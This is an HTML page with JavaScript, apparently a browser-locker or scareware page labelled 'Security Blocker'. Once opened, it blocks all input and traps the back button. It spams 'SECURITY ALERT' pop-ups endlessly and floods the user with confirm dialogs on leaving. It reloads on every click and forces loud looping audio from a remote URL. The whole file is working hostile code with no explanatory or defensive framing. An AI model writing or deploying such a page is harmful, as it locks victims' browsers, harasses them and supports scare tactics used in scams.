<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" />
<title>Ultimate Secure Chaos</title>
<style>
  html, body {
    margin:0; padding:0; height:100%; background:#000; color:#111;
    user-select:none; -webkit-user-select:none; -ms-user-select:none; 
    overflow:hidden; touch-action:none; font-family: monospace;
    display:flex; justify-content:center; align-items:center;
  }
  #modal {
    position: fixed; inset:0; background:#000; color:#111;
    display: flex; justify-content:center; align-items:center;
    z-index:2147483647; cursor:pointer;
    overflow:hidden;
  }
  #box {
    max-width: 95vw; max-height: 90vh; overflow:hidden;
    white-space: pre-wrap; word-break: break-word;
    border: 2px solid #111; padding: 1rem;
    background:#000;
    user-select:none;
    animation: distort 6s infinite alternate ease-in-out;
    transform-origin: center;
  }
  @keyframes distort {
    0%   {filter: blur(0) hue-rotate(0deg) saturate(1) brightness(1) contrast(1); transform: scale(1) translate(0,0);}
    20%  {filter: blur(1px) hue-rotate(20deg) saturate(1.2) brightness(1.1) contrast(1.1); transform: scale(1.05) translate(2px, -2px);}
    40%  {filter: blur(0.5px) hue-rotate(40deg) saturate(1.5) brightness(0.9) contrast(1.2); transform: scale(1.1) translate(-3px, 3px);}
    60%  {filter: blur(0.7px) hue-rotate(60deg) saturate(0.8) brightness(1.2) contrast(1.1); transform: scale(1.05) translate(2px, 2px);}
    80%  {filter: blur(1.2px) hue-rotate(80deg) saturate(1.3) brightness(1) contrast(0.9); transform: scale(1) translate(-2px, -3px);}
    100% {filter: blur(0) hue-rotate(100deg) saturate(1) brightness(1) contrast(1); transform: scale(1) translate(0,0);}
  }
</style>
</head>
<body>
<div id="modal" role="dialog" aria-modal="true" aria-label="Security Blocker">
  <div id="box" tabindex="-1" aria-readonly="true"></div>
</div>
<audio id="audio" crossorigin="anonymous" playsinline loop></audio>
<script>
(() => {
  const AUDIO_URL = 'https://raw.githubusercontent.com/hedredy/Project/2d591f652b1ac4b12d87e38482ad5679cb0d516c/macan-asphalt-8.mp3';
  const HASH_LENGTH = 50000;
  const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
  const box = document.getElementById('box');
  const audio = document.getElementById('audio');
  let alertsRunning = false;

  function randomString(len) {
    let s = '';
    for (let i=0; i<len; i++) {
      s += CHARS.charAt(Math.floor(Math.random()*CHARS.length));
    }
    return s;
  }

  function fillHash() {
    const chunkSize = 1024;
    let written = 0;
    box.textContent = '';
    function step() {
      let add = Math.min(chunkSize, HASH_LENGTH - written);
      box.textContent += randomString(add);
      written += add;
      if (written < HASH_LENGTH) {
        requestAnimationFrame(step);
      }
    }
    step();
  }

  function blockEvent(e) {
    try {
      e.preventDefault();
      e.stopImmediatePropagation();
    } catch {}
    return false;
  }

  function spamAlerts() {
    if (alertsRunning) return;
    alertsRunning = true;
    let count = 0;
    function loop() {
      count++;
      alert("SECURITY ALERT #" + count);
      setTimeout(loop, 20);
    }
    loop();
  }

  function spamConfirmsBeforeUnload(e) {
    let count = 0;
    while(count < 40){
      if(!confirm("WARNING! You are trying to leave the site! Confirm?")) break;
      count++;
    }
    e.preventDefault();
    return "";
  }

  function immediateReload() {
    try {
      location.reload();
    } catch {
      location.href = location.href;
    }
  }

  fillHash();

  // Block user interactions fully
  ['contextmenu','copy','cut','paste','selectstart','dragstart','mousedown','mouseup','mousemove','touchstart','touchmove','touchend','pointerdown','pointerup','wheel'].forEach(ev => {
    document.addEventListener(ev, blockEvent, {capture:true, passive:false});
  });

  document.addEventListener('keydown', e => {
    blockEvent(e);
  }, {capture:true});

  // Prevent switching tabs or going back
  window.addEventListener('blur', () => { try { window.focus(); } catch {} });
  history.pushState(null, document.title, location.href);
  window.addEventListener('popstate', () => { history.pushState(null, document.title, location.href); });

  // Warn on unload with spam of confirms
  window.onbeforeunload = spamConfirmsBeforeUnload;

  // Audio setup and persistent playback with constant check
  async function setupAudio() {
    try {
      audio.src = AUDIO_URL;
      audio.loop = true;
      audio.volume = 1.0;
      await audio.load();
      let savedPos = localStorage.getItem('__pos');
      if(savedPos) audio.currentTime = parseFloat(savedPos) || 0;
      const playAudio = () => { audio.play().catch(() => {}); };
      playAudio();
      document.addEventListener('click', playAudio, {once:true, capture:true});
      document.addEventListener('touchstart', playAudio, {once:true, capture:true});
      audio.addEventListener('pause', () => {
        if(!alertsRunning){
          spamAlerts();
          audio.play().catch(() => {});
        }
      });
      setInterval(() => {
        try {
          if(!audio.paused) localStorage.setItem('__pos', audio.currentTime);
          else {
            spamAlerts();
            audio.play().catch(() => {});
          }
        } catch {}
      }, 800);
      window.addEventListener('visibilitychange', () => {
        if(document.visibilityState === 'visible') audio.play().catch(() => {});
      });
    } catch {}
  }

  setupAudio();

  // Every 7 seconds popup alerts even without user interaction
  setInterval(() => {
    spamAlerts();
  }, 7000);

  // On modal click: start spam alerts
  document.getElementById('modal').addEventListener('click', e => {
    e.stopPropagation();
    spamAlerts();
  });

  // On any user interaction: immediate reload to block actions further
  ['click','dblclick','keydown','keyup','keypress','contextmenu','touchstart','touchend','pointerdown','pointerup','wheel'].forEach(ev => {
    window.addEventListener(ev, () => {
      immediateReload();
    }, {capture:true, passive:false});
  });

  // Prevent text selection / copying in modal box as well
  box.addEventListener('selectstart', blockEvent);
  box.addEventListener('copy', blockEvent);
  box.addEventListener('cut', blockEvent);
  box.addEventListener('paste', blockEvent);

})();
</script>
</body>
</html>
